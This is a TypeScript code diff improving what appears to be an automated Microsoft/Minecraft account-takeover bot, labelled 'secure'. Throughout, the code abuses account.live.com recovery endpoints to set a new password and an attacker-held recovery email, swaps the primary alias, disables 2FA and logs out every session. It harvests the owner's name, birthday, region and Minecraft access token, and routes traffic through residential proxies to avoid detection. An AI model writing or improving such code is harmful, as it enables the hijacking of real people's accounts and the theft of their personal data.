@@ -1044,10 +1044,21 @@ async function recover(
   newPassword: string,
   emailToken: string,
   signal?: AbortSignal,
-): Promise<{ urlPost: string; recoveryCode: string } | null> {
+): Promise<{ urlPost: string; recoveryCode: string }> {
   try {
     if (signal?.aborted) throw new Error("Aborted before recovery");
-    const res = await fetchWithJar(jar, `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=${email}`, {}, { timeoutMs: 25_000 });
+    const res = await fetchWithJar(
+      jar,
+      `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=${encodeURIComponent(email)}`,
+      {
+        headers: {
+          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+          "User-Agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+        },
+      },
+      { timeoutMs: 35_000, followRedirects: true },
+    );
     const text = await res.text();
 
     let serverData: Record<string, string> | null = null;
@@ -1063,14 +1074,17 @@ async function recover(
       }
     }
     if (!serverData) {
-      console.error("[secure] recover: ServerData missing");
-      return null;
+      const snip = text.replace(/\s+/g, " ").slice(0, 180);
+      throw new Error(
+        `recover ServerData missing status=${res.status} len=${text.length} snip=${snip}`,
+      );
     }
 
     const rawToken = serverData.sRecoveryToken || serverData.recoveryToken || "";
     if (!rawToken) {
-      console.error("[secure] recover: sRecoveryToken missing");
-      return null;
+      throw new Error(
+        `recover sRecoveryToken missing keys=${Object.keys(serverData).slice(0, 15).join(",")}`,
+      );
     }
     const decodedToken = decodeURIComponent(String(rawToken)).replace(
       /\\u([0-9A-Fa-f]{4})/g,
@@ -1101,88 +1115,138 @@ async function recover(
       }),
       signal,
     }, { timeoutMs: 25_000 });
-    const recJson = (await recRes.json()) as Record<string, string>;
-    if (!recJson.apiCanary) return null;
+    const recText = await recRes.text();
+    let recJson: Record<string, string>;
+    try {
+      recJson = JSON.parse(recText) as Record<string, string>;
+    } catch {
+      throw new Error(`VerifyRecoveryCode non-json status=${recRes.status} body=${recText.slice(0, 160)}`);
+    }
+    if (!recJson.apiCanary) {
+      throw new Error(
+        `VerifyRecoveryCode failed status=${recRes.status} body=${recText.slice(0, 200)}`,
+      );
+    }
 
     const canary = recJson.apiCanary;
     const token = recJson.token;
 
-    const sendCodeRes = await fetchWithJar(jar, "https://account.live.com/api/Proofs/SendOtt", {
-      method: "POST",
-      headers: {
-        "Content-type": "application/json; charset=utf-8",
-        Accept: "application/json",
-        canary,
-        hpgid: "200284",
-        hpgact: "0",
+    const sendCodeRes = await fetchWithJar(
+      jar,
+      "https://account.live.com/api/Proofs/SendOtt",
+      {
+        method: "POST",
+        headers: {
+          "Content-type": "application/json; charset=utf-8",
+          Accept: "application/json",
+          canary,
+          hpgid: "200284",
+          hpgact: "0",
+        },
+        body: JSON.stringify({
+          associationType: "None",
+          action: "VerifyNewProof",
+          channel: "Email",
+          cxt: "MP",
+          proofId: newEmail,
+          scid: 100103,
+          token,
+          uiflvr: 1001,
+        }),
+        signal,
       },
-      body: JSON.stringify({
-        associationType: "None",
-        action: "VerifyNewProof",
-        channel: "Email",
-        cxt: "MP",
-        proofId: newEmail,
-        scid: 100103,
-        token,
-        uiflvr: 1001,
-      }),
-      signal,
-    }, { timeoutMs: 25_000 });
-    const sendCodeJson = (await sendCodeRes.json()) as Record<string, string>;
-    if (!sendCodeJson.apiCanary) return null;
+      { timeoutMs: 25_000 },
+    );
+    const sendText = await sendCodeRes.text();
+    let sendCodeJson: Record<string, string>;
+    try {
+      sendCodeJson = JSON.parse(sendText) as Record<string, string>;
+    } catch {
+      throw new Error(`SendOtt non-json status=${sendCodeRes.status} body=${sendText.slice(0, 160)}`);
+    }
+    if (!sendCodeJson.apiCanary) {
+      throw new Error(`SendOtt failed status=${sendCodeRes.status} body=${sendText.slice(0, 200)}`);
+    }
 
     // Firstmail IMAP uses the mailbox API token as password, NOT the new MS password
     const otpCode = await getEmailCode(newEmail, emailToken, signal);
 
-    const verifyRes = await fetchWithJar(jar, "https://account.live.com/API/Proofs/VerifyCode", {
-      method: "POST",
-      headers: {
-        "Content-type": "application/json; charset=utf-8",
-        Accept: "application/json",
-        canary: sendCodeJson.apiCanary,
-        hpgid: "200284",
-        hpgact: "0",
+    const verifyRes = await fetchWithJar(
+      jar,
+      "https://account.live.com/API/Proofs/VerifyCode",
+      {
+        method: "POST",
+        headers: {
+          "Content-type": "application/json; charset=utf-8",
+          Accept: "application/json",
+          canary: sendCodeJson.apiCanary,
+          hpgid: "200284",
+          hpgact: "0",
+        },
+        body: JSON.stringify({
+          action: "VerifyOtc",
+          proofId: newEmail,
+          scid: 100103,
+          token,
+          uiflvr: 1001,
+          code: otpCode,
+        }),
       },
-      body: JSON.stringify({
-        action: "VerifyOtc",
-        proofId: newEmail,
-        scid: 100103,
-        token,
-        uiflvr: 1001,
-        code: otpCode,
-      }),
-    });
-    const verifyJson = (await verifyRes.json()) as Record<string, string>;
+      { timeoutMs: 25_000 },
+    );
+    const verifyText = await verifyRes.text();
+    let verifyJson: Record<string, string>;
+    try {
+      verifyJson = JSON.parse(verifyText) as Record<string, string>;
+    } catch {
+      throw new Error(`VerifyCode non-json status=${verifyRes.status} body=${verifyText.slice(0, 160)}`);
+    }
+    if (!verifyJson.apiCanary) {
+      throw new Error(`VerifyCode failed status=${verifyRes.status} body=${verifyText.slice(0, 200)}`);
+    }
 
-    const finishRes = await fetchWithJar(jar, "https://account.live.com/API/Recovery/RecoverUser", {
-      method: "POST",
-      headers: {
-        "Content-type": "application/json; charset=utf-8",
-        Accept: "application/json",
-        canary: verifyJson.apiCanary,
-        hpgid: "200284",
-        hpgact: "0",
+    const finishRes = await fetchWithJar(
+      jar,
+      "https://account.live.com/API/Recovery/RecoverUser",
+      {
+        method: "POST",
+        headers: {
+          "Content-type": "application/json; charset=utf-8",
+          Accept: "application/json",
+          canary: verifyJson.apiCanary,
+          hpgid: "200284",
+          hpgact: "0",
+        },
+        body: JSON.stringify({
+          contactEmail: newEmail,
+          contactEpid: "",
+          password: newPassword,
+          passwordExpiryEnabled: 0,
+          scid: 100103,
+          token,
+          uaid: "6b182876e51a429db0e2cff317076750",
+          uiflvr: 1001,
+        }),
       },
-      body: JSON.stringify({
-        contactEmail: newEmail,
-        contactEpid: "",
-        password: newPassword,
-        passwordExpiryEnabled: 0,
-        scid: 100103,
-        token,
-        uaid: "6b182876e51a429db0e2cff317076750",
-        uiflvr: 1001,
-      }),
-    });
-    const finishJson = (await finishRes.json()) as Record<string, string>;
+      { timeoutMs: 30_000 },
+    );
+    const finishText = await finishRes.text();
+    let finishJson: Record<string, string>;
+    try {
+      finishJson = JSON.parse(finishText) as Record<string, string>;
+    } catch {
+      throw new Error(`RecoverUser non-json status=${finishRes.status} body=${finishText.slice(0, 160)}`);
+    }
 
     if (finishJson.recoveryCode) {
       return { urlPost: postUrl, recoveryCode: finishJson.recoveryCode };
     }
-    return null;
+    throw new Error(
+      `RecoverUser no recoveryCode status=${finishRes.status} body=${finishText.slice(0, 220)}`,
+    );
   } catch (e) {
     console.error("[secure] recover error:", e);
-    return null;
+    throw e instanceof Error ? e : new Error(String(e));
   }
 }
 
@@ -1251,7 +1315,7 @@ async function changePrimaryAlias(jar: CookieJar, emailName: string, apiCanary: 
   }
 }
 
-const SECURE_HARD_TIMEOUT_MS = 4 * 60_000; // hard stop so jobs never hang forever
+const SECURE_HARD_TIMEOUT_MS = 7 * 60_000; // login + recovery + firstmail + cleanup
 
 export async function runSecureBot(
   jobId: string,
@@ -1297,6 +1361,17 @@ export async function runSecureBot(
 
     if (!loggedIn) {
       await log("info", "[secure] Python login unavailable/failed — trying node fallback...");
+      // Still stick a residential proxy so post-login isn't bare VPS
+      try {
+        const { loadProxyUrls } = await import("./proxy-fetch.js");
+        const urls = loadProxyUrls();
+        if (urls.length) {
+          setStickyProxy(urls[Math.floor(Math.random() * urls.length)]);
+          await log("info", "[secure] sticky proxy set from pool for node fallback login");
+        }
+      } catch {
+        /* ignore */
+      }
       let liveData: LiveData;
       try {
         liveData = await getLiveData(jar);
@@ -1353,10 +1428,12 @@ export async function runSecureBot(
 
     ensureAlive();
 
+    // ---- RECOVERY ASAP after login (skip AMC/MC until after — they burn session/time) ----
     let apiCanary = "";
     try {
-      await log("info", "[secure] Getting cookies...");
-      apiCanary = await getCookies(jar);
+      await log("info", "[secure] Getting cookies / apiCanary (via sticky proxy)...");
+      apiCanary = await withTimeout(getCookies(jar), 40_000, "getCookies");
+      await log("info", `[secure] apiCanary ok len=${apiCanary.length}`);
     } catch (e) {
       await log(
         "warn",
@@ -1366,89 +1443,25 @@ export async function runSecureBot(
 
     ensureAlive();
 
-    let t: string | null = null;
+    // AMRP soft elevates session for security APIs
     try {
-      await log("info", "[secure] Getting TOS token...");
-      t = await getT(jar);
-    } catch (e) {
-      await log("warn", `[secure] TOS token failed: ${e instanceof Error ? e.message : e}`);
-    }
-
-    ensureAlive();
-
-    let verificationToken: string | null = null;
-    try {
-      await log("info", "[secure] Getting verification token...");
-      verificationToken = await getAMC(jar);
-    } catch (e) {
-      await log(
-        "warn",
-        `[secure] AMC token failed (continuing): ${e instanceof Error ? e.message : e}`,
-      );
-    }
-
-    ensureAlive();
-
-    if (verificationToken) {
-      await log("info", "[secure] Getting owner info...");
-      const ownerInfo = await getOwnerInfo(jar, verificationToken);
-      if (ownerInfo) {
-        result.firstName = ownerInfo.firstName;
-        result.lastName = ownerInfo.lastName;
-        result.region = ownerInfo.region;
-        result.birthday = ownerInfo.birthday;
-      }
-    } else {
-      await log("warn", "[secure] Skipping owner info (no AMC token)");
-    }
-
-    ensureAlive();
-
-    // Get Xbox/Minecraft info (optional — do not fail whole job)
-    try {
-      await log("info", "[secure] Getting Xbox Live profile...");
-      const xbl = await getXBL(jar);
-
-      if (xbl) {
-        await log("info", "[secure] Getting Minecraft access token...");
-        const ssid = await getSSID(xbl);
-        if (ssid) {
-          result.ssid = ssid;
-          await log("info", "[secure] Got Minecraft access token");
-
-          const capes = await getCapesList(ssid);
-          if (capes) result.capes = capes;
-
-          const profile = await getProfile(ssid);
-          if (profile) {
-            result.mcUsername = profile;
-            await log("info", `[secure] MC Username: ${profile}`);
-          }
-
-          const method = await getMethod(ssid);
-          if (method) {
-            result.method = method;
-            await log("info", `[secure] Purchase method: ${method}`);
-          }
-        }
-      }
-    } catch (e) {
-      await log(
-        "warn",
-        `[secure] MC profile step skipped: ${e instanceof Error ? e.message : String(e)}`,
-      );
-    }
-
-    ensureAlive();
-
-    // ---- RECOVERY FIRST (proofs/services can kill session / canary) ----
-    if (t) {
-      try {
-        await log("info", "[secure] Getting AMRP...");
+      await log("info", "[secure] Getting TOS/AMRP elevation...");
+      const t = await withTimeout(getT(jar), 25_000, "getT");
+      if (t) {
         await withTimeout(getAMRP(jar, t), 20_000, "getAMRP");
-      } catch (e) {
-        await log("warn", `[secure] AMRP skipped: ${e instanceof Error ? e.message : e}`);
+        await log("info", "[secure] AMRP elevation done");
+        // refresh canary after elevation
+        try {
+          const refreshed = await getCookies(jar);
+          if (refreshed) apiCanary = refreshed;
+        } catch {
+          /* ignore */
+        }
+      } else {
+        await log("warn", "[secure] No TOS t token — continuing without AMRP");
       }
+    } catch (e) {
+      await log("warn", `[secure] AMRP skipped: ${e instanceof Error ? e.message : e}`);
     }
 
     ensureAlive();
@@ -1473,6 +1486,15 @@ export async function runSecureBot(
       );
       mainEmail = secInfo.email || config.email;
       encryptedNetId = secInfo.encryptedNetId;
+      // canary may appear inside sec page blob
+      const blobCanary = deepFindString(secInfo.raw, ["apiCanary", "canary"]);
+      if (blobCanary && !apiCanary) {
+        try {
+          apiCanary = decodeUnicode(decodeURIComponent(blobCanary));
+        } catch {
+          apiCanary = decodeUnicode(blobCanary);
+        }
+      }
       await log(
         "info",
         `[secure] Sec info ok email=${mainEmail || "?"} netId=${encryptedNetId ? "yes" : "no"} canary=${apiCanary ? "yes" : "no"}`,
@@ -1523,46 +1545,42 @@ export async function runSecureBot(
             "recover",
           );
 
-          if (recoveryResult) {
-            result.newEmail = newEmailData.email;
-            result.newPassword = newPassword;
-            result.recoveryCode = recoveryResult.recoveryCode;
-            await log("info", "[secure] Account secured successfully!");
+          result.newEmail = newEmailData.email;
+          result.newPassword = newPassword;
+          result.recoveryCode = recoveryResult.recoveryCode;
+          await log("info", "[secure] Account secured successfully!");
 
-            // Refresh canary after recovery for alias / logout
-            try {
-              const refreshed = await getCookies(jar);
-              if (refreshed) apiCanary = refreshed;
-            } catch {
-              /* ignore */
-            }
+          // Refresh canary after recovery for alias / logout
+          try {
+            const refreshed = await getCookies(jar);
+            if (refreshed) apiCanary = refreshed;
+          } catch {
+            /* ignore */
+          }
 
-            ensureAlive();
-            await log("info", "[secure] Changing primary alias...");
-            try {
-              const aliasName = `auto${Math.random().toString(36).slice(2, 14)}`;
-              const aliasChanged = await withTimeout(
-                changePrimaryAlias(jar, aliasName, apiCanary),
-                30_000,
-                "changePrimaryAlias",
-              );
-              if (aliasChanged) {
-                result.newEmail = `${aliasName}@outlook.com`;
-                await log("info", `[secure] Primary alias changed to ${result.newEmail}`);
-              } else {
-                await log(
-                  "warn",
-                  "[secure] Failed to change primary alias - email recovery address preserved",
-                );
-              }
-            } catch (e) {
+          ensureAlive();
+          await log("info", "[secure] Changing primary alias...");
+          try {
+            const aliasName = `auto${Math.random().toString(36).slice(2, 14)}`;
+            const aliasChanged = await withTimeout(
+              changePrimaryAlias(jar, aliasName, apiCanary),
+              30_000,
+              "changePrimaryAlias",
+            );
+            if (aliasChanged) {
+              result.newEmail = `${aliasName}@outlook.com`;
+              await log("info", `[secure] Primary alias changed to ${result.newEmail}`);
+            } else {
               await log(
                 "warn",
-                `[secure] alias change skipped: ${e instanceof Error ? e.message : e}`,
+                "[secure] Failed to change primary alias - email recovery address preserved",
               );
             }
-          } else {
-            await log("error", "[secure] Recovery flow returned null");
+          } catch (e) {
+            await log(
+              "warn",
+              `[secure] alias change skipped: ${e instanceof Error ? e.message : e}`,
+            );
           }
         }
       } catch (e) {
@@ -1578,9 +1596,59 @@ export async function runSecureBot(
       );
     }
 
-    ensureAlive();
+    const secured =
+      result.newEmail !== "Couldn't Change!" &&
+      result.newPassword !== "Couldn't Change!" &&
+      result.recoveryCode !== "Couldn't Change!" &&
+      !!result.newEmail &&
+      !!result.newPassword &&
+      !!result.recoveryCode;
 
-    // Best-effort cleanup AFTER recovery (do not block success)
+    if (!secured) {
+      await log(
+        "error",
+        "[secure] Recovery did not complete — refusing false success (credentials unchanged)",
+      );
+      return null;
+    }
+
+    // Optional enrichment AFTER success (must not fail the job)
+    try {
+      await log("info", "[secure] Getting AMC/owner info (optional)...");
+      const verificationToken = await withTimeout(getAMC(jar), 30_000, "getAMC");
+      if (verificationToken) {
+        const ownerInfo = await getOwnerInfo(jar, verificationToken);
+        if (ownerInfo) {
+          result.firstName = ownerInfo.firstName;
+          result.lastName = ownerInfo.lastName;
+          result.region = ownerInfo.region;
+          result.birthday = ownerInfo.birthday;
+        }
+      }
+    } catch (e) {
+      await log("warn", `[secure] owner info skipped: ${e instanceof Error ? e.message : e}`);
+    }
+
+    try {
+      await log("info", "[secure] Getting Xbox/MC profile (optional)...");
+      const xbl = await withTimeout(getXBL(jar), 40_000, "getXBL");
+      if (xbl) {
+        const ssid = await getSSID(xbl);
+        if (ssid) {
+          result.ssid = ssid;
+          const capes = await getCapesList(ssid);
+          if (capes) result.capes = capes;
+          const profile = await getProfile(ssid);
+          if (profile) result.mcUsername = profile;
+          const method = await getMethod(ssid);
+          if (method) result.method = method;
+        }
+      }
+    } catch (e) {
+      await log("warn", `[secure] MC profile skipped: ${e instanceof Error ? e.message : e}`);
+    }
+
+    // Best-effort cleanup AFTER recovery success
     if (apiCanary) {
       try {
         await log("info", "[secure] Disabling 2FA...");
@@ -1618,22 +1686,6 @@ export async function runSecureBot(
       }
     } catch (e) {
       await log("warn", `[secure] logoutAll: ${e instanceof Error ? e.message : e}`);
-    }
-
-    const secured =
-      result.newEmail !== "Couldn't Change!" &&
-      result.newPassword !== "Couldn't Change!" &&
-      result.recoveryCode !== "Couldn't Change!" &&
-      !!result.newEmail &&
-      !!result.newPassword &&
-      !!result.recoveryCode;
-
-    if (!secured) {
-      await log(
-        "error",
-        "[secure] Recovery did not complete — refusing false success (credentials unchanged)",
-      );
-      return null;
     }
 
     await log("info", "[secure] Securing pipeline complete!");
